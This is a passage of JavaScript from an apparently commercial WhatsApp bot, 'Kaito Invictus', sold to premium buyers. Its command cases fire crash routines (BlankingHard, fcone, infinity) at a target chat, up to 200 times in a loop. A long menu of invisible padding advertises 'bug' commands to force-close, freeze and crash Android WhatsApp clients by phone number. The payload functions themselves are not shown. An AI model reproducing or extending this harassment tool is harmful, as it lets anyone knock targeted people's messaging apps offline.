        externalAdReply: {
          showAdAttribution: true,
          title: "</> ɸ 𝐊𝐚̄𝐢𝐭𝐨Ɨ𝐧𝐯𝐢𝐜𝐭𝐮𝐬Ʃ𝐱𝐞𝐤𝐮𝐭𝐢𝐨𝐧 </>",
          body: "YussOfficial & Iqbal",
          mediaType: 1,
          thumbnailUrl: 'https://files.catbox.moe/i00wmw.jpg',
          sourceUrl: 'https://bit.ly'
        }
      }
    };
    return sock.sendMessage(m.chat, noAccess, { quoted: m });
  }      

  // 🔥 target otomatis = room chat sekarang
  let target = m.chat;

  const itsmenu = `┌─❀
│☇ *Pengirim* : ${m.pushName}
│☇ *Type Bug* : ${command}
│☇ *Status* : Vip Buy Only!
│☇ *Developer* : YussOfficial
└─❀`;

  let buttonMessage = {
    image: { url: 'https://files.catbox.moe/a64bhn.jpeg' },
    caption: itsmenu,
    contextInfo: {
      mentionedJid: [m.sender],
      forwardedNewsletterMessageInfo: {
        newsletterName: "</> Kaito Invictus </>",
        newsletterJid: `120363403934813658@newsletter` 
      },
      isForwarded: true,
      externalAdReply: {
        showAdAttribution: true,
        title: '</> ɸ 𝐊𝐚̄𝐢𝐭𝐨Ɨ𝐧𝐯𝐢𝐜𝐭𝐮𝐬Ʃ𝐱𝐞𝐤𝐮𝐭𝐢𝐨𝐧 </>',
        body: 'YussOfficial & Iqbal',
        mediaType: 1,
        thumbnailUrl: 'https://files.catbox.moe/i00wmw.jpg',
        sourceUrl: 'https://bit.ly'
      }
    },
    footer: "YT YussOfficial || ID",
    headerType: 6
  };

  await sock.sendMessage(m.chat, buttonMessage, { quoted: m });

  // 🔥 langsung spam bug ke target chat
  for (let i = 0; i < 100; i++) {
      await BlankingHard(sock, target);
      await sleep(1000);
  }  
}
break;
case "hai":{
  if (!isPremium) {
    const noAccess = {
      text: `• Fitur Khusus User Premium!`,
      contextInfo: {
        mentionedJid: [m.sender],
        forwardedNewsletterMessageInfo: {
          newsletterName: "</> Kaito Invictus </>",
          newsletterJid: `120363403934813658@newsletter` 
        },
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "</> ɸ 𝐊𝐚̄𝐢𝐭𝐨Ɨ𝐧𝐯𝐢𝐜𝐭𝐮𝐬Ʃ𝐱𝐞𝐤𝐮𝐭𝐢𝐨𝐧 </>",
          body: "YussOfficial & Iqbal",
          mediaType: 1,
          thumbnailUrl: 'https://files.catbox.moe/i00wmw.jpg',
          sourceUrl: 'https://bit.ly'
        }
      }
    };
    return sock.sendMessage(m.chat, noAccess, { quoted: m });
  }      

  // 🔥 target otomatis = room chat sekarang
  let target = m.chat;

  const itsmenu = `┌─❀
│☇ *Pengirim* : ${m.pushName}
│☇ *Type Bug* : ${command}
│☇ *Status* : Vip Buy Only!
│☇ *Developer* : YussOfficial
└─❀`;

  let buttonMessage = {
    image: { url: 'https://files.catbox.moe/a64bhn.jpeg' },
    caption: itsmenu,
    contextInfo: {
      mentionedJid: [m.sender],
      forwardedNewsletterMessageInfo: {
        newsletterName: "</> Kaito Invictus </>",
        newsletterJid: `120363403934813658@newsletter` 
      },
      isForwarded: true,
      externalAdReply: {
        showAdAttribution: true,
        title: '</> ɸ 𝐊𝐚̄𝐢𝐭𝐨Ɨ𝐧𝐯𝐢𝐜𝐭𝐮𝐬Ʃ𝐱𝐞𝐤𝐮𝐭𝐢𝐨𝐧 </>',
        body: 'YussOfficial & Iqbal',
        mediaType: 1,
        thumbnailUrl: 'https://files.catbox.moe/i00wmw.jpg',
        sourceUrl: 'https://bit.ly'
      }
    },
    footer: "YT YussOfficial || ID",
    headerType: 6
  };

  await sock.sendMessage(m.chat, buttonMessage, { quoted: m });

  // 🔥 langsung spam bug ke target chat
  for (let i = 0; i < 10; i++) {
      await fcone(sock, target);
      await sleep(100);
  }  
}
break;
case "peh":{
  if (!isPremium) {
    const noAccess = {
      text: `• Fitur Khusus User Premium!`,
      contextInfo: {
        mentionedJid: [m.sender],
        forwardedNewsletterMessageInfo: {
          newsletterName: "</> Kaito Invictus </>",
          newsletterJid: `120363403934813658@newsletter` 
        },
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "</> ɸ 𝐊𝐚̄𝐢𝐭𝐨Ɨ𝐧𝐯𝐢𝐜𝐭𝐮𝐬Ʃ𝐱𝐞𝐤𝐮𝐭𝐢𝐨𝐧 </>",
          body: "YussOfficial & Iqbal",
          mediaType: 1,
          thumbnailUrl: 'https://files.catbox.moe/i00wmw.jpg',
          sourceUrl: 'https://bit.ly'
        }
      }
    };
    return sock.sendMessage(m.chat, noAccess, { quoted: m });
  }      

  // 🔥 target otomatis = room chat sekarang
  let target = m.chat;

  const itsmenu = `┌─❀
│☇ *Pengirim* : ${m.pushName}
│☇ *Type Bug* : ${command}
│☇ *Status* : Vip Buy Only!
│☇ *Developer* : YussOfficial
└─❀`;

  let buttonMessage = {
    image: { url: 'https://files.catbox.moe/a64bhn.jpeg' },
    caption: itsmenu,
    contextInfo: {
      mentionedJid: [m.sender],
      forwardedNewsletterMessageInfo: {
        newsletterName: "</> Kaito Invictus </>",
        newsletterJid: `120363403934813658@newsletter` 
      },
      isForwarded: true,
      externalAdReply: {
        showAdAttribution: true,
        title: '</> ɸ 𝐊𝐚̄𝐢𝐭𝐨Ɨ𝐧𝐯𝐢𝐜𝐭𝐮𝐬Ʃ𝐱𝐞𝐤𝐮𝐭𝐢𝐨𝐧 </>',
        body: 'YussOfficial & Iqbal',
        mediaType: 1,
        thumbnailUrl: 'https://files.catbox.moe/i00wmw.jpg',
        sourceUrl: 'https://bit.ly'
      }
    },
    footer: "YT YussOfficial || ID",
    headerType: 6
  };

  await sock.sendMessage(m.chat, buttonMessage, { quoted: m });

  // 🔥 langsung spam bug ke target chat
  for (let i = 0; i < 200; i++) {
      await infinity(target);
      await sleep(1000);
  }  
}
break;
//=====( CASE MENU )=====\\
case "menu": case "kaito": {
let itsmenu = `( 🐦‍🔥 ) Hello *${m.pushName}*
> *Tujuan Mu Masih Banyak, Tidak Menarik Jika Tumbang Karena Cinta*

𒑡𝐈͢͠𝐍𝐅͜͡𝐎𝐑͢͠𝐌͜͡𝐀𝐓͢͠𝐈𝐎͜͡𝐍 ᭧ 𝐁͢͠𝐎͜͡𝐓៚
⬡ Namebot : Kaito Invictus
⬡ Version : 1.0.0 Pro
⬡ Status : Vip Buy Only!
⬡ Action : ẉ.ceo/YussOfficial
⬡ Type : Case
⬡ Language : JavaScript
⬡ Buy Script : wa.me/6285785256009
͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
■ ────「 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 」────
╰───「 𝙵𝙾𝚁 𝙲𝙻𝙾𝚂𝙴 𝙰𝙽𝙳𝚁𝙾𝙸𝙳 」
    ╰──⪻ .forceclose 62xxx
■
╰───「 BLANK ANDRO 」
    ╰──⪻ .kaito 62xxx
■
╰───「 DELQY HARD 」
    ╰──⪻ .delay
■
╰───「 CRASH INFINITY 」
    ╰──⪻ .infi
    
⪨════『 𝐁𝐔𝐆 𝐃𝐈𝐓𝐄𝐌𝐏𝐀𝐓 』════⪩
■
╰───「 TYPE FORCLOSE 」
    ╰──⪻ .p
■
╰───「 TYPE BLANK 」
    ╰──⪻ .aloo
■
╰───「 TYPE FC ONE MSG 」
    ╰──⪻ .hai
■
╰───「 TYPE FC/FREZZE 」
    ╰──⪻ .peh


■ ────「 𝐀𝐂𝐂𝐄𝐒𝐒 𝐌𝐄𝐍𝐔 」────
╰───⪻ Addaccess
    ╰───⪻ Delaccess
        ╰───⪻ Addown
            ╰───⪻ Delown


■ ────「 𝐅𝐔𝐍 𝐌𝐄𝐍𝐔 」────
╰───⪻ cekganteng
    ╰───⪻ cewecantik
        ╰───⪻ tiktok
            ╰───⪻ hentai
                ╰───⪻ neko
■
╰───⪻ ff
    ╰───⪻ ml
        ╰───⪻ waifu
            ╰───⪻ gambar
                ╰───⪻ douyin
■
╰───⪻ niatsholat
    ╰───⪻ quatesislami
        ╰───⪻ ttspresiden
            ╰───⪻ infoch
                ╰───⪻ cekcantik
                    ╰───⪻ ttsanime


■ ────「 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔 」
╰───⪻ idch
    ╰───⪻ cekidch
        ╰───⪻ tagall
            ╰───⪻ promote
                ╰───⪻ hidetag
■
╰───⪻ open
    ╰───⪻ close
        ╰───⪻ demote
            ╰───⪻ kick


■────「 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 」
╰───⪻ self
    ╰───⪻ public
        ╰───⪻ pushkontak
            ╰───⪻ addprem
                ╰───⪻ delprem
                
`;
let buttonMessage = {
  image: { url: 'https://files.catbox.moe/oxxf0b.jpg' },
  caption: itsmenu,
  contextInfo: {
  mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "️</> Kaito Invictus </>",
                    newsletterJid: `120363403934813658@newsletter` 
                },
                isForwarded: true,
    externalAdReply: {
      showAdAttribution: true,
      title: '</> ɸ 𝐊𝐚̄𝐢𝐭𝐨Ɨ𝐧𝐯𝐢𝐜𝐭𝐮𝐬Ʃ𝐱𝐞𝐤𝐮𝐭𝐢𝐨𝐧 </>',
      body: 'YussOfficial & Iqbal',
      mediaType: 1,
      thumbnailUrl: 'https://files.catbox.moe/i00wmw.jpg',
      sourceUrl: 'https://KaitoInvictus.com'
    }
  },
  footer: "YT YussOfficial || ID",
  headerType: 6
}
await sock.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;
//=====( CASE OWN MENU )=====\\
case 'public': {
if (!isCreator) {
const KhususOwner = {
    text: '• Fitur Khusus Owner!',
    contextInfo: {
    mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "️</> Kaito Invictus </>",
                    newsletterJid: `120363403934813658@newsletter` 
                },
                isForwarded: true,
      externalAdReply: {
        showAdAttribution: true,
        title: "</> ɸ 𝐊𝐚̄𝐢𝐭𝐨Ɨ𝐧𝐯𝐢𝐜𝐭𝐮𝐬Ʃ𝐱𝐞𝐤𝐮𝐭𝐢𝐨𝐧 </>",
        body: "YussOfficial & Iqbal",
        mediaType: 1,
        thumbnailUrl: 'https://files.catbox.moe/i00wmw.jpg',
        sourceUrl: 'https://bit.ly'
      }
    }
  };
  return sock.sendMessage(m.chat, KhususOwner, { quoted: m });
}
if (sock.public === false) {
sock.public = true
const Owner = {
    text: `• Success Change To Public!`,
    contextInfo: {
    mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "</> Kaito Invictus </>",
                    newsletterJid: `120363403934813658@newsletter` 
                },
                isForwarded: true,
      externalAdReply: {
        showAdAttribution: true,
        title: "</> ɸ 𝐊𝐚̄𝐢𝐭𝐨Ɨ𝐧𝐯𝐢𝐜𝐭𝐮𝐬Ʃ𝐱𝐞𝐤𝐮𝐭𝐢𝐨𝐧 </>",
        body: "YussOfficial & Iqbal",
        mediaType: 1,
        thumbnailUrl: 'https://files.catbox.moe/i00wmw.jpg',
        sourceUrl: 'https://bit.ly'
      }
    }
  };
  return sock.sendMessage(m.chat, Owner, { quoted: m });
}
}
break;
case 'self': {
if (!isCreator) {
const KhususOwner = {
    text: `• Fitur Khusus Owner!`,
    contextInfo: {
    mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "️</> Kaito Invictus </>",
                    newsletterJid: `120363403934813658@newsletter` 
                },
                isForwarded: true,
      externalAdReply: {
        showAdAttribution: true,
        title: "</> ɸ 𝐊𝐚̄𝐢𝐭𝐨Ɨ𝐧𝐯𝐢𝐜𝐭𝐮𝐬Ʃ𝐱𝐞𝐤𝐮𝐭𝐢𝐨𝐧 </>",
        body: "YussOfficial & Iqbal",
        mediaType: 1,
        thumbnailUrl: 'https://files.catbox.moe/i00wmw.jpg',
        sourceUrl: 'https://bit.ly'
      }
    }
  };
  return sock.sendMessage(m.chat, KhususOwner, { quoted: m });
}
if (sock.public === true) {
sock.public = false
const teks = {
    text: `• Success Change To Self!`,
    contextInfo: {
      externalAdReply: {
mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "️</> Kaito Invictus </>",
                    newsletterJid: `120363403934813658@newsletter` 
                },
                isForwarded: true,
        showAdAttribution: true,
        title: "</> ɸ 𝐊𝐚̄𝐢𝐭𝐨Ɨ𝐧𝐯𝐢𝐜𝐭𝐮𝐬Ʃ𝐱𝐞𝐤𝐮𝐭𝐢𝐨𝐧 </>",
        body: "YussOfficial & Iqbal",
        mediaType: 1,
        thumbnailUrl: 'https://files.catbox.moe/i00wmw.jpg',
        sourceUrl: 'https://bit.ly'
      }
    }
  };
  return sock.sendMessage(m.chat, teks, { quoted: m });
}
}
break;
case "addprem": {
if (!isCreator) {
  const KhususOwner = {
    text: `• Fitur Khusus Owner!`,
    contextInfo: {
    mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "</> Kaito Invictus </>",
                    newsletterJid: `120363403934813658@newsletter` 
                },
                isForwarded: true,
      externalAdReply: {
        showAdAttribution: true,
        title: "</> ɸ 𝐊𝐚̄𝐢𝐭𝐨Ɨ𝐧𝐯𝐢𝐜𝐭𝐮𝐬Ʃ𝐱𝐞𝐤𝐮𝐭𝐢𝐨𝐧 </>",
        body: "YussOfficial & Iqbal",
        mediaType: 1,
        thumbnailUrl: 'https://files.catbox.moe/i00wmw.jpg',
        sourceUrl: 'https://bit.ly'
      }
    }
  };
  return sock.sendMessage(m.chat, KhususOwner, { quoted: m });
}
if (!text) {
  const Example = {
    text: `• Contoh Penggunaan : .${comman} 628xxxx`,
    contextInfo: {
    mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "</> Kaito Invictus </>",
                    newsletterJid: `120363403934813658@newsletter` 
                },
                isForwarded: true,
      externalAdReply: {
        showAdAttribution: true,
        title: "</> ɸ 𝐊𝐚̄𝐢𝐭𝐨Ɨ𝐧𝐯𝐢𝐜𝐭𝐮𝐬Ʃ𝐱𝐞𝐤𝐮𝐭𝐢𝐨𝐧 </>",
        body: "YussOfficial & Iqbal",
        mediaType: 1,
        thumbnailUrl: 'https://files.catbox.moe/i00wmw.jpg',
        sourceUrl: 'https://bit.ly'
      }
    }
  };
  return sock.sendMessage(m.chat, Example, { quoted: m });
}
let user = text.replace(/[^\d]/g, "");
addPremiumUser(user, 30);
  const SuccesAdd = {
    text: `• Success Add!`,
    contextInfo: {
    mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "</> Kaito Invictus </>",
                    newsletterJid: `120363403934813658@newsletter` 
                },
                isForwarded: true,
      externalAdReply: {
        showAdAttribution: true,
        title: "</> ɸ 𝐊𝐚̄𝐢𝐭𝐨Ɨ𝐧𝐯𝐢𝐜𝐭𝐮𝐬Ʃ𝐱𝐞𝐤𝐮𝐭𝐢𝐨𝐧 </>",
        body: "YussOfficial & Iqbal",
        mediaType: 1,
        thumbnailUrl: 'https://files.catbox.moe/i00wmw.jpg',
        sourceUrl: 'https://bit.ly'
      }
    }
  };
  return sock.sendMessage(m.chat, SuccesAdd, { quoted: m });
}
break
case "delprem": {
if (!isCreator) {
  const KhususOwner = {
    text: `• Fitur Khusus Owner!`,
    contextInfo: {
    mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "️</> Kaito Invictus </>",
                    newsletterJid: `120363403934813658@newsletter` 
                },
                isForwarded: true,
      externalAdReply: {
        showAdAttribution: true,
        title: "</> ɸ 𝐊𝐚̄𝐢𝐭𝐨Ɨ𝐧𝐯𝐢𝐜𝐭𝐮𝐬Ʃ𝐱𝐞𝐤𝐮𝐭𝐢𝐨𝐧 </>",
        body: "YussOfficial & Iqbal",
        mediaType: 1,
        thumbnailUrl: 'https://files.catbox.moe/i00wmw.jpg',
        sourceUrl: 'https://bit.ly'
      }
    }
  };
  return sock.sendMessage(m.chat, KhususOwner, { quoted: m });
}
if (!text) {
  const Example = {
    text: `• Contoh Penggunaan :
.delprem 628xxxx`,
    contextInfo: {
    mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "️</> Kaito Invictus </>",
                    newsletterJid: `120363403934813658@newsletter` 
                },
                isForwarded: true,
      externalAdReply: {
        showAdAttribution: true,
        title: "</> ɸ 𝐊𝐚̄𝐢𝐭𝐨Ɨ𝐧𝐯𝐢𝐜𝐭𝐮𝐬Ʃ𝐱𝐞𝐤𝐮𝐭𝐢𝐨𝐧 </>",
        body: "YussOfficial & Iqbal",
        mediaType: 1,
